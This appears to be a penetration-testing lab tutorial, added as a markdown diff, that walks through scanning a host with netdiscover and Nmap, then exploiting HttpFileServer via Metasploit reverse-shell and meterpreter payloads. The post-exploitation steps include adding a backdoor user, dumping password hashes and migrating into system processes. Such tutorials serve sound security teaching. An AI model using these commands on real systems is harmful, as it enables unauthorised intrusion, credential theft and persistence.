@@ -1,0 +1,268 @@
+# 🚩 **Practical: PING Scanning & Exploitation**
+
+## 📌 **Goal**
+
+1️⃣ Discover live hosts with **netdiscover** & **ping**
+2️⃣ Scan for open ports with **Nmap**
+3️⃣ Identify services & versions
+4️⃣ Search exploits with **searchsploit**
+5️⃣ Launch exploit with **Metasploit**
+6️⃣ Get a shell & elevate with **meterpreter**
+
+---
+
+## 🔹 **Step 1 — Find Live Hosts**
+
+Use **netdiscover** to detect live IPs in the local subnet:
+
+```bash
+sudo netdiscover -i eth0
+```
+
+✅ `-i eth0` → Replace `eth0` with your active interface (`ip a` to check).
+
+---
+
+## 🔹 **Step 2 — Ping a Host**
+
+Check if a host is live:
+
+```bash
+ping -c 3 <IP>
+```
+
+✅ `-c 3` → Send 3 ICMP packets only.
+
+For Windows discovery, note that sometimes **NBNS** is used for name resolution on local Windows hosts — tools like `nbtscan` can help.
+
+---
+
+## 🔹 **Step 3 — Basic Port Scan**
+
+Use SYN scan for open ports:
+
+```bash
+nmap -sS <IP>
+```
+
+✅ Example output:
+
+```
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+```
+
+---
+
+## 🔹 **Step 4 — Access Found Service**
+
+If you find **port 8080** open, open it in a browser:
+
+```
+http://<IP>:8080
+```
+
+✔️ Look for banners or software version details.
+
+---
+
+## 🔹 **Step 5 — Check for FTP**
+
+Try anonymous login if FTP port found (21/tcp):
+
+```bash
+ftp <IP>
+Name: anonymous
+Password: <press Enter>
+```
+
+---
+
+## 🔹 **Step 6 — OS & Service Detection**
+
+Run **Nmap OS detection**:
+
+```bash
+nmap -O -Pn <IP>
+```
+
+- `-O` → Enable OS fingerprinting.
+- `-Pn` → Treat all hosts as up.
+
+Run **service version detection**:
+
+```bash
+nmap -sV -Pn <IP>
+```
+
+✔️ Note down version:
+
+```
+80/tcp open  http Apache httpd 2.4.58
+```
+
+---
+
+## 🔹 **Step 7 — Search for Exploits**
+
+Check for known exploits for the service:
+
+```bash
+searchsploit Apache httpd 2.4.58
+searchsploit httpfileserver
+```
+
+---
+
+## 🔹 **Step 8 — Exploit with Metasploit**
+
+Open **new terminal** → launch Metasploit:
+
+```bash
+sudo msfconsole
+```
+
+Search exploit module:
+
+```bash
+search httpfileserver
+```
+
+Use the module:
+
+```bash
+use 0
+```
+
+Find payloads:
+
+```bash
+show payloads
+```
+
+Set payload:
+
+```bash
+set payload windows/shell/reverse_tcp
+```
+
+Check options:
+
+```bash
+show options
+```
+
+Set target IP:
+
+```bash
+set RHOSTS <IP>
+```
+
+Set listener port:
+
+```bash
+set LPORT 443
+```
+
+Launch:
+
+```bash
+run
+```
+
+✅ If successful:
+
+```
+Microsoft Windows [Version ...]
+C:\Webserver> whoami
+whoami
+```
+
+Output:
+
+```
+dcserver\jack
+```
+
+---
+
+## 🔹 **Step 9 — Add User (example)**
+
+Inside shell:
+
+```bash
+net user hack1 /add
+```
+
+✔️ Adds user `hack1`.
+
+Exit:
+
+```bash
+exit
+```
+
+---
+
+## 🔹 **Step 10 — Get Meterpreter**
+
+Back in Metasploit:
+
+```bash
+show payloads
+```
+
+Find a **meterpreter** payload:
+
+```bash
+set payload windows/meterpreter/reverse_tcp
+show options
+run
+```
+
+✅ If you get `meterpreter>` prompt → You have advanced shell!
+
+---
+
+## 🔹 **Step 11 — Post-Exploitation**
+
+Basic Meterpreter commands:
+
+```bash
+meterpreter > help
+meterpreter > hashdump
+# If hashdump fails:
+# Operation failed: 1168 → Try privilege escalation first
+
+meterpreter > ps
+# Shows running processes
+
+meterpreter > migrate <PID>
+# Example: migrate 952 (dwm.exe)
+# Or: migrate 820 (svchost.exe)
+# Or: migrate 2404 (conhost.exe)
+```
+
+---
+
+## ✅ **Practical Flow Summary**
+
+| Step            | Command                                               |
+| --------------- | ----------------------------------------------------- |
+| Discover IPs    | `sudo netdiscover -i eth0`                            |
+| Ping host       | `ping -c 3 <IP>`                                      |
+| Scan ports      | `nmap -sS <IP>`                                       |
+| OS scan         | `nmap -O -Pn <IP>`                                    |
+| Version scan    | `nmap -sV -Pn <IP>`                                   |
+| Search exploits | `searchsploit <service>`                              |
+| Metasploit      | `sudo msfconsole`                                     |
+| Use exploit     | `use 0`                                               |
+| Set payload     | `set payload windows/shell/reverse_tcp`               |
+| Set RHOSTS      | `set RHOSTS <IP>`                                     |
+| Set LPORT       | `set LPORT 443`                                       |
+| Run exploit     | `run`                                                 |
+| Meterpreter     | `set payload windows/meterpreter/reverse_tcp` → `run` |
+
+---
